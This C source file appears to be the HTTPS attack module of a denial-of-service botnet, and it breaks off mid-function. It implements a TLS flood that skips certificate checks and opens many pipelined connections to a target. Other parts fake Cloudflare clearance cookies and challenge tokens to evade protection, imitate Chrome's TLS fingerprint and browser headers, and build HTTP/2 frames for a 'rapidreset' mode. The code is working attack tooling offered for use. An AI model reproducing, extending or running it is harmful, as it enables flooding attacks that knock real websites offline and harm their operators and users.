#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <time.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>

#include <bearssl.h>

#define MODULE_TAG "https"
#include "../headers/debug.h"

#include "https_method.h"
#include "http_common.h"
#include "../headers/protocol.h"
#include "../headers/attack_core.h"

#define HTTPS_MAX_CONNS     256
#define HTTPS_MAX_REQ       4096
#define HTTPS_MAX_PIPELINE  10
#define HTTPS_CONN_TIMEOUT  15
#define HTTPS_MAX_REQUESTS  150

/* ── BearSSL no-verify X.509 context ─────────────────────── */

static void xnoverify_start_chain(const br_x509_class **ctx, const char *server_name) {
    (void)ctx; (void)server_name;
}

static void xnoverify_start_cert(const br_x509_class **ctx, uint32_t length) {
    (void)ctx; (void)length;
}

static void xnoverify_append(const br_x509_class **ctx, const unsigned char *buf, size_t len) {
    (void)ctx; (void)buf; (void)len;
}

static void xnoverify_end_cert(const br_x509_class **ctx) {
    (void)ctx;
}

static unsigned xnoverify_end_chain(const br_x509_class **ctx) {
    (void)ctx;
    return 0; /* always trust */
}

static const br_x509_pkey *xnoverify_get_pkey(const br_x509_class *const *ctx, unsigned *usages) {
    (void)ctx;
    if (usages) *usages = BR_KEYTYPE_RSA | BR_KEYTYPE_EC;
    /* Return a dummy — BearSSL only needs the pointer to be non-NULL for the handshake
       to proceed. We provide a minimal static RSA public key structure. */
    static const unsigned char dummy_n[] = { 0x01 };
    static const unsigned char dummy_e[] = { 0x01, 0x00, 0x01 };
    static const br_rsa_public_key dummy_rsa = {
        (unsigned char *)dummy_n, sizeof(dummy_n),
        (unsigned char *)dummy_e, sizeof(dummy_e)
    };
    static const br_x509_pkey dummy_pkey = {
        .key_type = BR_KEYTYPE_RSA,
        .key = { .rsa = { (unsigned char *)dummy_n, sizeof(dummy_n),
                           (unsigned char *)dummy_e, sizeof(dummy_e) } }
    };
    return &dummy_pkey;
}

typedef struct {
    const br_x509_class *vtable;
} xnoverify_context;

static const br_x509_class xnoverify_vtable = {
    sizeof(xnoverify_context),
    xnoverify_start_chain,
    xnoverify_start_cert,
    xnoverify_append,
    xnoverify_end_cert,
    xnoverify_end_chain,
    xnoverify_get_pkey
};

/* ── TLS Connection ──────────────────────────────────────── */

typedef struct {
    int fd;
    uint8_t state;        /* 0=closed, 1=tcp_connecting, 2=tls_handshake, 3=ready */
    time_t created;
    int requests_sent;
    br_ssl_client_context sc;
    xnoverify_context xc;
    unsigned char iobuf[BR_SSL_BUFSIZE_MONO];
} https_conn_t;

static int tls_low_read(void *ctx, unsigned char *buf, size_t len) {
    int fd = *(int *)ctx;
    ssize_t n = recv(fd, buf, len, MSG_DONTWAIT);
    if (n == 0) return -1;
    if (n < 0) {
        if (errno == EAGAIN || errno == EWOULDBLOCK) return 0;
        return -1;
    }
    return (int)n;
}

static int tls_low_write(void *ctx, const unsigned char *buf, size_t len) {
    int fd = *(int *)ctx;
    ssize_t n = send(fd, buf, len, MSG_NOSIGNAL | MSG_DONTWAIT);
    if (n <= 0) {
        if (errno == EAGAIN || errno == EWOULDBLOCK) return 0;
        return -1;
    }
    return (int)n;
}

/*
 * Chrome-like TLS 1.2 cipher suite ordering.
 * BearSSL does not support TLS 1.3 natively; these are the TLS 1.2
 * ECDHE suites in Chrome's preference order.
 */
static const uint16_t chrome_cipher_suites[] = {
    BR_TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,      /* 0xC02B */
    BR_TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,         /* 0xC02F */
    BR_TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,       /* 0xC02C */
    BR_TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,         /* 0xC030 */
    BR_TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,  /* 0xCCA9 */
    BR_TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,    /* 0xCCA8 */
};

static void tls_conn_init(https_conn_t *c, const char *host, const char *alpn_h2) {
    /* Suppress SNI for raw IP addresses (RFC 6066) */
    const char *sni = (host && !http_is_ip_address(host)) ? host : NULL;
    DEBUG_PRINT("tls_conn_init: host=%s sni=%s alpn=%s fd=%d", host ? host : "(null)", sni ? sni : "(null)", alpn_h2 ? alpn_h2 : "(none)", c->fd);
    /* init_full stores a pointer to dummy_xc (not a copy). We replace it
       immediately below with our no-verify engine, so the dangling stack
       pointer is never dereferenced. Do NOT insert code between init_full
       and set_x509 that could trigger X.509 usage. */
    br_x509_minimal_context dummy_xc;
    br_ssl_client_init_full(&c->sc, &dummy_xc, NULL, 0);
    c->xc.vtable = &xnoverify_vtable;
    br_ssl_engine_set_x509(&c->sc.eng, &c->xc.vtable);
    DEBUG_PRINT("tls_conn_init: engine initialized with no-verify x509");

    /* Override cipher suite order to match Chrome TLS fingerprint */
    br_ssl_engine_set_suites(&c->sc.eng, chrome_cipher_suites,
        sizeof(chrome_cipher_suites) / sizeof(chrome_cipher_suites[0]));

    /* Set ALPN if requested (for rapidreset h2) */
    if (alpn_h2) {
        static const char *alpn_names[] = { "h2" };
        br_ssl_engine_set_protocol_names(&c->sc.eng, alpn_names, 1);
    }

    br_ssl_engine_set_buffer(&c->sc.eng, c->iobuf, sizeof(c->iobuf), 0);
    br_ssl_client_reset(&c->sc, sni, 0);
    DEBUG_PRINT("tls_conn_init: complete, engine ready");
}

/* Drive BearSSL engine: returns 1 if ready for app data, 0 if still handshaking, -1 on error */
static int tls_drive(https_conn_t *c) {
    for (;;) {
        unsigned state = br_ssl_engine_current_state(&c->sc.eng);

        if (state & BR_SSL_CLOSED) { DEBUG_PRINT("tls_drive: engine CLOSED err=%d fd=%d", br_ssl_engine_last_error(&c->sc.eng), c->fd); return -1; }
        if (state & BR_SSL_SENDAPP) return 1; /* handshake done, can send */

        if (state & BR_SSL_SENDREC) {
            unsigned char *buf;
            size_t len;
            buf = br_ssl_engine_sendrec_buf(&c->sc.eng, &len);
            int n = tls_low_write(&c->fd, buf, len);
            if (n < 0) return -1;
            if (n == 0) return 0;
            br_ssl_engine_sendrec_ack(&c->sc.eng, n);
            continue;
        }

        if (state & BR_SSL_RECVREC) {
            unsigned char *buf;
            size_t len;
            buf = br_ssl_engine_recvrec_buf(&c->sc.eng, &len);
            int n = tls_low_read(&c->fd, buf, len);
            if (n < 0) return -1;
            if (n == 0) return 0;
            br_ssl_engine_recvrec_ack(&c->sc.eng, n);
            continue;
        }

        if (state & BR_SSL_RECVAPP) {
            /* App data available — drain it (we discard responses) */
            unsigned char *buf;
            size_t len;
            buf = br_ssl_engine_recvapp_buf(&c->sc.eng, &len);
            br_ssl_engine_recvapp_ack(&c->sc.eng, len);
            continue;
        }

        return 0;
    }
}

/* Write application data through TLS. Returns bytes written or -1. */
static int tls_write(https_conn_t *c, const void *data, size_t len) {
    const unsigned char *ptr = (const unsigned char *)data;
    size_t total = 0;

    while (total < len) {
        unsigned state = br_ssl_engine_current_state(&c->sc.eng);
        if (state & BR_SSL_CLOSED) { DEBUG_PRINT("tls_write: engine CLOSED err=%d len=%zu", br_ssl_engine_last_error(&c->sc.eng), len); return -1; }

        if (state & BR_SSL_SENDAPP) {
            unsigned char *buf;
            size_t avail;
            buf = br_ssl_engine_sendapp_buf(&c->sc.eng, &avail);
            if (avail == 0) { tls_drive(c); continue; }
            size_t chunk = (len - total) < avail ? (len - total) : avail;
            memcpy(buf, ptr + total, chunk);
            br_ssl_engine_sendapp_ack(&c->sc.eng, chunk);
            br_ssl_engine_flush(&c->sc.eng, 0);
            total += chunk;
        }

        /* Flush send records */
        if (tls_drive(c) < 0) return -1;
    }
    return (int)total;
}

/* Drain all pending receive data (discard) */
static void tls_drain(https_conn_t *c) {
    for (int i = 0; i < 5; i++) {
        int r = tls_drive(c);
        if (r < 0) break;
        if (r == 0) break;
    }
}

static void tls_conn_close(https_conn_t *c) {
    DEBUG_PRINT("tls_conn_close: fd=%d state=%u", c->fd, c->state);
    if (c->fd > 0) {
        /* Best-effort TLS close_notify to avoid fingerprinting via abrupt RST */
        br_ssl_engine_close(&c->sc.eng);
        tls_drive(c);
        close(c->fd);
        c->fd = 0;
    }
    c->state = 0;
}

/* ── Request building ────────────────────────────────────── */

typedef struct {
    const char *method_str;
    const char *host;
    const char *path;
    const char *cookie;
    const char *referer;
    const char *post_data;
    int post_len;
    int randpath;
    int mode;
} https_request_opts;

static int build_https_flood_request(char *buf, size_t buf_size,
    const https_request_opts *opts, const char *ua)
{
    char full_path[1024];
    if (opts->randpath) {
        char rstr[12];
        http_generate_random_string(rstr, 8);
        snprintf(full_path, sizeof(full_path), "%s?%s", opts->path, rstr);
    } else {
        snprintf(full_path, sizeof(full_path), "%s", opts->path);
    }

    int is_post = (strcmp(opts->method_str, "POST") == 0);

    char extra[1024] = "";
    int eoff = 0;
    if (opts->cookie[0])
        eoff += snprintf(extra + eoff, sizeof(extra) - eoff, "Cookie: %s\r\n", opts->cookie);
    if (opts->referer[0])
        eoff += snprintf(extra + eoff, sizeof(extra) - eoff, "Referer: %s\r\n", opts->referer);
    if (is_post) {
        int blen = (opts->post_data && opts->post_len > 0) ? opts->post_len : 11;
        eoff += snprintf(extra + eoff, sizeof(extra) - eoff,
            "Content-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\n", blen);
    }

    int len = snprintf(buf, buf_size,
        "%s %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: %s\r\n"
        "Accept: */*\r\n"
        "Accept-Encoding: gzip, deflate, br\r\n"
        "%s"
        "Connection: keep-alive\r\n"
        "\r\n",
        opts->method_str, full_path, opts->host, ua, extra);

    if (is_post && len < (int)buf_size - 1) {
        if (opts->post_data && opts->post_len > 0) {
            int space = (int)buf_size - len - 1;
            int copy = opts->post_len < space ? opts->post_len : space;
            memcpy(buf + len, opts->post_data, copy);
            len += copy;
        } else {
            int space = (int)buf_size - len - 1;
            int copy = 11 < space ? 11 : space;
            memcpy(buf + len, "data=random", copy);
            len += copy;
        }
        buf[len] = '\0';
    }
    return len;
}

static int build_cfbypass_request(char *buf, size_t buf_size,
    const https_request_opts *opts, const char *ua)
{
    (void)ua; /* use correlated identity instead */
    const browser_identity_t *id = http_get_random_identity();

    /* Random query string mimicking CF challenge tokens */
    char full_path[1024];
    char rstr[32];
    http_generate_random_string(rstr, 16);
    snprintf(full_path, sizeof(full_path), "%s?__cf_chl_rt_tk=%s", opts->path, rstr);

    /* Fake cf_clearance cookie */
    char cf_cookie[256];
    char tok[24];
    http_generate_random_string(tok, 22);
    snprintf(cf_cookie, sizeof(cf_cookie), "cf_clearance=%s.0.0", tok);

    char cookie_hdr[768] = "";
    if (opts->cookie[0])
        snprintf(cookie_hdr, sizeof(cookie_hdr), "Cookie: %s; %s\r\n", cf_cookie, opts->cookie);
    else
        snprintf(cookie_hdr, sizeof(cookie_hdr), "Cookie: %s\r\n", cf_cookie);

    char etag[20];
    http_generate_random_string(etag, 12);

    /* Build sec-ch-ua headers only for Chromium-based browsers */
    char sec_ch_hdrs[512] = "";
    if (id->sec_ch_ua) {
        snprintf(sec_ch_hdrs, sizeof(sec_ch_hdrs),
            "sec-ch-ua: %s\r\n"
            "sec-ch-ua-mobile: ?0\r\n"
            "sec-ch-ua-platform: %s\r\n",
            id->sec_ch_ua, id->sec_ch_platform);
    }

    int len = snprintf(buf, buf_size,
        "GET %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: %s\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
        "Accept-Encoding: gzip, deflate, br\r\n"
        "Accept-Language: en-US,en;q=0.9\r\n"
        "Cache-Control: max-age=0\r\n"
        "%s"
        "If-None-Match: W/\"%s\"\r\n"
        "Sec-Fetch-Dest: document\r\n"
        "Sec-Fetch-Mode: navigate\r\n"
        "Sec-Fetch-Site: none\r\n"
        "Sec-Fetch-User: ?1\r\n"
        "Upgrade-Insecure-Requests: 1\r\n"
        "%s"
        "Connection: keep-alive\r\n"
        "\r\n",
        full_path, opts->host, id->user_agent, cookie_hdr, etag, sec_ch_hdrs);

    return len;
}

static int build_browser_request(char *buf, size_t buf_size,
    const https_request_opts *opts, const char *ua)
{
    (void)ua; /* use correlated identity instead */
    const browser_identity_t *id = http_get_random_identity();

    char full_path[1024];
    if (opts->randpath) {
        char rstr[12];
        http_generate_random_string(rstr, 8);
        snprintf(full_path, sizeof(full_path), "%s?%s", opts->path, rstr);
    } else {
        snprintf(full_path, sizeof(full_path), "%s", opts->path);
    }

    char cookie_hdr[768] = "";
    if (opts->cookie[0])
        snprintf(cookie_hdr, sizeof(cookie_hdr), "Cookie: %s\r\n", opts->cookie);

    char referer_hdr[768] = "";
    if (opts->referer[0])
        snprintf(referer_hdr, sizeof(referer_hdr), "Referer: %s\r\n", opts->referer);

    int lang_idx = attack_rand_next() % HTTP_NUM_ACCEPT_LANGUAGES;

    /* Build sec-ch-ua headers only for Chromium-based browsers */
    char sec_ch_hdrs[512] = "";
    if (id->sec_ch_ua) {
        snprintf(sec_ch_hdrs, sizeof(sec_ch_hdrs),
            "sec-ch-ua: %s\r\n"
            "sec-ch-ua-mobile: ?0\r\n"
            "sec-ch-ua-platform: %s\r\n",
            id->sec_ch_ua, id->sec_ch_platform);
    }

    int len = snprintf(buf, buf_size,
        "GET %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: %s\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n"
        "Accept-Encoding: gzip, deflate, br, zstd\r\n"
        "Accept-Language: %s\r\n"
        "Cache-Control: max-age=0\r\n"
        "%s"
        "%s"
        "Sec-Fetch-Dest: document\r\n"
        "Sec-Fetch-Mode: navigate\r\n"
        "Sec-Fetch-Site: none\r\n"
        "Sec-Fetch-User: ?1\r\n"
        "Upgrade-Insecure-Requests: 1\r\n"
        "%s"
        "Priority: u=0, i\r\n"
        "Connection: keep-alive\r\n"
        "\r\n",
        full_path, opts->host, id->user_agent,
        HTTP_ACCEPT_LANGUAGES[lang_idx],
        cookie_hdr, referer_hdr,
        sec_ch_hdrs);

    return len;
}

/* ── HTTP/2 frame helpers for RapidReset ─────────────────── */

#define H2_FRAME_HEADER_SIZE  9
#define H2_TYPE_DATA          0x00
#define H2_TYPE_HEADERS       0x01
#define H2_TYPE_RST_STREAM    0x03
#define H2_TYPE_SETTINGS      0x04
#define H2_TYPE_WINDOW_UPDATE 0x08
#define H2_FLAG_END_STREAM    0x01
#define H2_FLAG_END_HEADERS   0x04

static const char H2_PREFACE[] = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
#define H2_PREFACE_LEN 24

static void h2_encode_frame_header(uint8_t *buf, uint32_t length, uint8_t type,
    uint8_t flags, uint32_t stream_id)
{
    buf[0] = (length >> 16) & 0xFF;
    buf[1] = (length >> 8) & 0xFF;
    buf[2] = length & 0xFF;
    buf[3] = type;
    buf[4] = flags;
    buf[5] = (stream_id >> 24) & 0x7F;
    buf[6] = (stream_id >> 16) & 0xFF;
    buf[7] = (stream_id >> 8) & 0xFF;
    buf[8] = stream_id & 0xFF;
}

/* Build SETTINGS frame (client settings) */
static int h2_build_settings(uint8_t *buf) {
    /* Settings: HEADER_TABLE_SIZE=65536, ENABLE_PUSH=0, MAX_CONCURRENT_STREAMS=1000,
       INITIAL_WINDOW_SIZE=6291456, MAX_HEADER_LIST_SIZE=262144 */
    uint8_t payload[] = {
        0x00, 0x01, 0x00, 0x01, 0x00, 0x00,  /* HEADER_TABLE_SIZE = 65536 */
        0x00, 0x02, 0x00, 0x00, 0x00, 0x00,  /* ENABLE_PUSH = 0 */
        0x00, 0x03, 0x00, 0x00, 0x03, 0xE8,  /* MAX_CONCURRENT_STREAMS = 1000 */
        0x00, 0x04, 0x00, 0x60, 0x00, 0x00,  /* INITIAL_WINDOW_SIZE = 6291456 */
        0x00, 0x06, 0x00, 0x04, 0x00, 0x00,  /* MAX_HEADER_LIST_SIZE = 262144 */
    };
    h2_encode_frame_header(buf, sizeof(payload), H2_TYPE_SETTINGS, 0, 0);
    memcpy(buf + H2_FRAME_HEADER_SIZE, payload, sizeof(payload));
    return H2_FRAME_HEADER_SIZE + sizeof(payload);
}

/* Build WINDOW_UPDATE frame */
static int h2_build_window_update(uint8_t *buf, uint32_t stream_id, uint32_t increment) {
    uint8_t payload[4];
    payload[0] = (increment >> 24) & 0x7F;
    payload[1] = (increment >> 16) & 0xFF;
    payload[2] = (increment >> 8) & 0xFF;
    payload[3] = increment & 0xFF;
    h2_encode_frame_header(buf, 4, H2_TYPE_WINDOW_UPDATE, 0, stream_id);
    memcpy(buf + H2_FRAME_HEADER_SIZE, payload, 4);
    return H2_FRAME_HEADER_SIZE + 4;
}

/* Build RST_STREAM frame */
static int h2_build_rst_stream(uint8_t *buf, uint32_t stream_id) {
    uint8_t payload[4] = {0x00, 0x00, 0x00, 0x08}; /* CANCEL */
    h2_encode_frame_header(buf, 4, H2_TYPE_RST_STREAM, 0, stream_id);
    memcpy(buf + H2_FRAME_HEADER_SIZE, payload, 4);
    return H2_FRAME_HEADER_SIZE + 4;
}

/*
 * Build a simple HPACK-encoded HEADERS frame using static table indices.
 * This avoids needing a full HPACK encoder.
 * Encodes: :method GET, :path <path>, :scheme https, :authority <host>
 */
static int h2_build_headers_frame(uint8_t *buf, uint32_t stream_id,
    const char *method, const char *path, const char *authority)
{
    uint8_t hpack[512];
    int hoff = 0;
    const int hpack_limit = (int)sizeof(hpack) - 10; /* safe ceiling */

    /* :method GET (index 2) or POST (index 3) */
    if (strcmp(method, "POST") == 0) {
        hpack[hoff++] = 0x83; /* indexed: 3 */
    } else {
        hpack[hoff++] = 0x82; /* indexed: 2 (GET) */
    }

    /* :scheme https (index 7) */
    hpack[hoff++] = 0x87;

    /* :path — literal with indexing, name index 4 */
    hpack[hoff++] = 0x44; /* literal header, indexed name 4 (:path) */
    int path_len = strlen(path);
    if (path_len > 127) path_len = 127;
    if (hoff + 1 + path_len > hpack_limit) return -1;
    hpack[hoff++] = (uint8_t)path_len;
    memcpy(hpack + hoff, path, path_len);
    hoff += path_len;

    /* :authority — literal with indexing, name index 1 */
    hpack[hoff++] = 0x41; /* literal header, indexed name 1 (:authority) */
    int auth_len = strlen(authority);
    if (auth_len > 127) auth_len = 127;
    if (hoff + 1 + auth_len > hpack_limit) return -1;
    hpack[hoff++] = (uint8_t)auth_len;
    memcpy(hpack + hoff, authority, auth_len);
    hoff += auth_len;

    /* user-agent — literal without indexing */
    const char *ua = http_get_random_user_agent();
    int ua_len = strlen(ua);
    /* Clamp UA to remaining space */
    int ua_max = hpack_limit - hoff - 8; /* 8 bytes overhead for length encoding + accept */
    if (ua_max < 0) return -1;
    if (ua_len > ua_max) ua_len = ua_max;
    if (ua_len > 200) ua_len = 200;
    /* name "user-agent" is static index 58 */
    hpack[hoff++] = 0x7A; /* literal, indexed name 58 (user-agent) — 0x40 | 58 */
    /* Encode length (may need 2 bytes for >127) */
    if (ua_len < 127) {
        hpack[hoff++] = (uint8_t)ua_len;
    } else {
        hpack[hoff++] = 0x7F;
        hpack[hoff++] = (uint8_t)(ua_len - 127);
    }
    memcpy(hpack + hoff, ua, ua_len);
    hoff += ua_len;

    if (hoff + 5 > (int)sizeof(hpack)) return -1;
    hpack[hoff++] = 0x53; /* literal, indexed name 19 (accept) — 0x40 | 19 */
    hpack[hoff++] = 0x03;
    memcpy(hpack + hoff, "*/*", 3);
    hoff += 3;

    h2_encode_frame_header(buf, hoff, H2_TYPE_HEADERS,
        H2_FLAG_END_HEADERS | H2_FLAG_END_STREAM, stream_id);
    memcpy(buf + H2_FRAME_HEADER_SIZE, hpack, hoff);
    return H2_FRAME_HEADER_SIZE + hoff;
}

/* ── Option parsing (shared) ─────────────────────────────── */

typedef struct {
    char host[256];
    char path[512];
    char user_agent[512];
    char cookie[512];
    char referer[512];
    char post_data[1024];
    int post_len;
    int randpath;
    int keepalive;
    int pipeline_depth;
    int use_random_ua;
    const char *method_str;
    uint16_t max_conns;
    uint16_t rate_limit;  /* requests per second, 0 = unlimited */
    uint8_t mode;
} https_config;

static void parse_https_config(attack_params *params, https_config *cfg) {
    memset(cfg, 0, sizeof(*cfg));

    attack_option *domain_opt = find_option(params, OPT_DOMAIN);
    attack_option *path_opt = find_option(params, OPT_PATH);
    attack_option *ua_opt = find_option(params, OPT_USERAGENT);
    attack_option *cookie_opt = find_option(params, OPT_COOKIE);
    attack_option *referer_opt = find_option(params, OPT_REFERER);
    attack_option *postdata_opt = find_option(params, OPT_POSTDATA);
    attack_option *keepalive_opt = find_option(params, OPT_KEEPALIVE);
    attack_option *pipeline_opt = find_option(params, OPT_PIPELINE);
    attack_option *uarand_opt = find_option(params, OPT_UARAND);
    attack_option *method_opt = find_option(params, OPT_METHOD);
    attack_option *randpath_opt = find_option(params, OPT_RANDPATH);
    attack_option *rate_opt = find_option(params, OPT_RATE);

    cfg->mode = get_attack_mode(params);
    cfg->max_conns = get_max_conns(params, HTTPS_MAX_CONNS);
    if (cfg->max_conns > HTTPS_MAX_CONNS) cfg->max_conns = HTTPS_MAX_CONNS;

    cfg->method_str = "GET";
    if (method_opt && method_opt->data && method_opt->len > 0) {
        if (method_opt->len >= 4 && strncasecmp((char *)method_opt->data, "POST", 4) == 0)
            cfg->method_str = "POST";
        else if (method_opt->len >= 4 && strncasecmp((char *)method_opt->data, "HEAD", 4) == 0)
            cfg->method_str = "HEAD";
    }

    if (domain_opt && domain_opt->data && domain_opt->len > 0) {
        int len = domain_opt->len < 255 ? domain_opt->len : 255;
        memcpy(cfg->host, domain_opt->data, len);
        cfg->host[len] = '\0';
    } else {
        inet_ntop(AF_INET, &params->target_addr.sin_addr, cfg->host, sizeof(cfg->host));
    }

    snprintf(cfg->path, sizeof(cfg->path), "/");
    if (path_opt && path_opt->data && path_opt->len > 0) {
        int len = path_opt->len < 511 ? path_opt->len : 511;
        memcpy(cfg->path, path_opt->data, len);
        cfg->path[len] = '\0';
    }

    cfg->use_random_ua = uarand_opt ? get_option_u8(uarand_opt) : 1;
    if (ua_opt && ua_opt->data && ua_opt->len > 0) {
        int len = ua_opt->len < 511 ? ua_opt->len : 511;
        memcpy(cfg->user_agent, ua_opt->data, len);
        cfg->user_agent[len] = '\0';
        cfg->use_random_ua = 0;
    }

    if (cookie_opt && cookie_opt->data && cookie_opt->len > 0) {
        int len = cookie_opt->len < 511 ? cookie_opt->len : 511;
        memcpy(cfg->cookie, cookie_opt->data, len);
        cfg->cookie[len] = '\0';
    }

    if (referer_opt && referer_opt->data && referer_opt->len > 0) {
        int len = referer_opt->len < 511 ? referer_opt->len : 511;
        memcpy(cfg->referer, referer_opt->data, len);
        cfg->referer[len] = '\0';
    }

    snprintf(cfg->post_data, sizeof(cfg->post_data), "data=random");
    cfg->post_len = 11;
    if (postdata_opt && postdata_opt->data && postdata_opt->len > 0) {
        cfg->post_len = postdata_opt->len < 1023 ? postdata_opt->len : 1023;
        memcpy(cfg->post_data, postdata_opt->data, cfg->post_len);
        cfg->post_data[cfg->post_len] = '\0';
    }

    cfg->randpath = randpath_opt ? get_option_u8(randpath_opt) : 0;
    cfg->keepalive = keepalive_opt ? get_option_u8(keepalive_opt) : 1;
    cfg->pipeline_depth = pipeline_opt ? get_option_u8(pipeline_opt) : 0;
    if (cfg->pipeline_depth > HTTPS_MAX_PIPELINE) cfg->pipeline_depth = HTTPS_MAX_PIPELINE;
    cfg->rate_limit = rate_opt ? get_option_u16(rate_opt) : 0;
}

/* ── Mode: flood / cfbypass / browser ────────────────────── */

static void https_http1_flood(attack_params *params, https_config *cfg) {
    DEBUG_PRINT("https_http1_flood: entry max_conns=%u sizeof(https_conn_t)=%zu", cfg->max_conns, sizeof(https_conn_t));
    https_conn_t *conns = (https_conn_t *)calloc(cfg->max_conns, sizeof(https_conn_t));
    if (!conns) return;

    struct pollfd *pfds = (struct pollfd *)malloc(cfg->max_conns * sizeof(struct pollfd));
    if (!pfds) { free(conns); return; }

    int *poll_map = (int *)malloc(cfg->max_conns * sizeof(int));
    if (!poll_map) { free(pfds); free(conns); return; }

    char *request = (char *)malloc(HTTPS_MAX_REQ * HTTPS_MAX_PIPELINE);
    if (!request) { free(poll_map); free(pfds); free(conns); return; }
    DEBUG_PRINT("https_http1_flood: all allocations OK (conns=%p pfds=%p poll_map=%p request=%p)", (void*)conns, (void*)pfds, (void*)poll_map, (void*)request);

    struct sockaddr_in target;
    memcpy(&target, &params->target_addr, sizeof(target));
    { char _a[INET_ADDRSTRLEN]; inet_ntop(AF_INET, &target.sin_addr, _a, sizeof(_a)); DEBUG_PRINT("https_http1_flood: target=%s:%d", _a, ntohs(target.sin_port)); }

    https_request_opts req_opts = {
        .method_str = cfg->method_str,
        .host = cfg->host,
        .path = cfg->path,
        .cookie = cfg->cookie,
        .referer = cfg->referer,
        .post_data = cfg->post_data,
        .post_len = cfg->post_len,
        .randpath = cfg->randpath,
        .mode = cfg->mode,
    };

    /* cfbypass and browser modes always use randpath */
    if (cfg->mode == MODE_HTTPS_CFBYPASS || cfg->mode == MODE_HTTPS_BROWSER)
        req_opts.randpath = 1;

    pps_tracker_t rate_tracker;
    pps_tracker_init(&rate_tracker, cfg->rate_limit);

    time_t end_time = time(NULL) + params->duration;
    struct timeval last_cleanup = {0, 0};

    DEBUG_PRINT("https_http1_flood: entering attack loop, end_time in %u sec", params->duration);
    while (params->active && time(NULL) < end_time) {
        /* Open new TLS connections */
        for (int i = 0; i < cfg->max_conns && params->active; i++) {
            if (conns[i].fd > 0) continue;

            int fd = socket(AF_INET, SOCK_STREAM, 0);
            if (fd < 0) continue;

            { int one = 1; setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one)); }
            http_set_nonblocking(fd);
            int ret = connect(fd, (struct sockaddr *)&target, sizeof(target));
            if (ret < 0 && errno != EINPROGRESS) { DEBUG_PRINT("https_http1_flood: connect failed fd=%d errno=%d (%s)", fd, errno, strerror(errno)); close(fd); continue; }

            conns[i].fd = fd;
            conns[i].state = 1;
            conns[i].created = time(NULL);
            conns[i].requests_sent = 0;
        }

        /* Poll for writable sockets */
        int nfds = 0;
        for (int i = 0; i < cfg->max_conns; i++) {
            if (conns[i].fd > 0) {
                pfds[nfds].fd = conns[i].fd;
                pfds[nfds].events = POLLOUT | POLLIN;
                pfds[nfds].revents = 0;
                poll_map[nfds] = i;
                nfds++;
            }
        }

        if (nfds > 0) poll(pfds, nfds, 10);

        for (int j = 0; j < nfds && params->active; j++) {
            int i = poll_map[j];
            if (conns[i].fd <= 0) continue;

            if (pfds[j].revents & (POLLERR | POLLHUP | POLLNVAL)) { DEBUG_PRINT("https_http1_flood: conn=%d poll error revents=0x%04X state=%u", i, pfds[j].revents, conns[i].state);
                tls_conn_close(&conns[i]);
                continue;
            }

            /* State 1: TCP connecting */
            if (conns[i].state == 1 && (pfds[j].revents & POLLOUT)) {
                int error = 0;
                socklen_t elen = sizeof(error);
                getsockopt(conns[i].fd, SOL_SOCKET, SO_ERROR, &error, &elen);
                if (error != 0) { DEBUG_PRINT("https_http1_flood: conn=%d SO_ERROR=%d (%s)", i, error, strerror(error)); tls_conn_close(&conns[i]); continue; }

                tls_conn_init(&conns[i], cfg->host, NULL);
                DEBUG_PRINT("https_http1_flood: conn=%d TCP connected, starting TLS", i);
                conns[i].state = 2;
            }

            /* State 2: TLS handshake */
            if (conns[i].state == 2) {
                int r = tls_drive(&conns[i]);
                if (r < 0) { DEBUG_PRINT("https_http1_flood: conn=%d TLS handshake failed", i); tls_conn_close(&conns[i]); continue; }
                if (r == 1) {
                    conns[i].state = 3;
                    DEBUG_PRINT("https_http1_flood: conn=%d TLS handshake complete -> ready", i);
                } else {
                    continue;
                }
            }

            /* State 3: Ready — send requests */
            if (conns[i].state == 3 && (pfds[j].revents & (POLLOUT | POLLIN))) {
                /* Rate limiting */
                int num_reqs_planned = (cfg->pipeline_depth > 1) ? cfg->pipeline_depth : 1;
                if (cfg->rate_limit > 0 && !pps_should_send(&rate_tracker, num_reqs_planned)) {
                    long sleep_us = pps_sleep_us(&rate_tracker);
                    if (sleep_us > 0) usleep(sleep_us);
                    continue;
                }
                const char *ua = cfg->use_random_ua ? http_get_random_user_agent() : cfg->user_agent;
                int total_len = 0;
                int num_reqs = (cfg->pipeline_depth > 1) ? cfg->pipeline_depth : 1;

                for (int p = 0; p < num_reqs; p++) {
                    if (cfg->use_random_ua && p > 0) ua = http_get_random_user_agent();
                    int slen;
                    if (cfg->mode == MODE_HTTPS_CFBYPASS)
                        slen = build_cfbypass_request(request + total_len,
                            HTTPS_MAX_REQ * HTTPS_MAX_PIPELINE - total_len, &req_opts, ua);
                    else if (cfg->mode == MODE_HTTPS_BROWSER)
                        slen = build_browser_request(request + total_len,
                            HTTPS_MAX_REQ * HTTPS_MAX_PIPELINE - total_len, &req_opts, ua);
                    else
                        slen = build_https_flood_request(request + total_len,
                            HTTPS_MAX_REQ * HTTPS_MAX_PIPELINE - total_len, &req_opts, ua);
                    if (slen <= 0) break;
                    total_len += slen;
                }

                if (total_len > 0) {
                    int w = tls_write(&conns[i], request, total_len);
                    if (w < 0) { DEBUG_PRINT("https_http1_flood: tls_write failed conn=%d", i); tls_conn_close(&conns[i]); continue; }
                    conns[i].requests_sent += num_reqs;
                }

                tls_drain(&conns[i]);

                if (!cfg->keepalive || conns[i].requests_sent > HTTPS_MAX_REQUESTS) {
                    tls_conn_close(&conns[i]);
                }
            }
        }

        /* Cleanup stale connections */
        struct timeval now;
